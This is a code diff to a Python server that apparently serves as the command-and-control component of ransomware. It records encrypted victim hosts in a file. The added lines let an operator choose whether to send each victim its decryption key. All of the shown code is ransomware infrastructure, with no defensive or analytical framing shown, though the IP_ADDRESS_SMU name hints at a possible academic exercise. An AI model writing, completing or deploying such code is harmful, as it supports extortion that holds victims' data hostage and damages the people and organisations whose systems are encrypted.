@@ -20,12 +20,24 @@ def handle_connection(connection, address):
             with open('encrypted_hosts.txt', 'a') as f:
                 f.write(original_msg + '\n')
                 f.close()
+
+            # Prompt the user for input (Y/N)
+            response = input("Send victim decryption key? (Y/N): ")
+            while response.upper() not in ['Y', 'N']:
+                response = input("Invalid input. Please enter Y or N: ")
+
+            if response.upper() == 'Y':
+                print("Sending decryption key to user")
+                connection.send(original_msg.encode('utf-8'))
+            else:
+                break   
+
     print(f"Connection from {address} closed")
 
 def start_server():
     print("Creating socket...")
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((IP_ADDRESS, PORT))
+        s.bind((IP_ADDRESS_SMU, PORT))
         print("Socket created, listening for connections...")
         s.listen(5)
         while True:
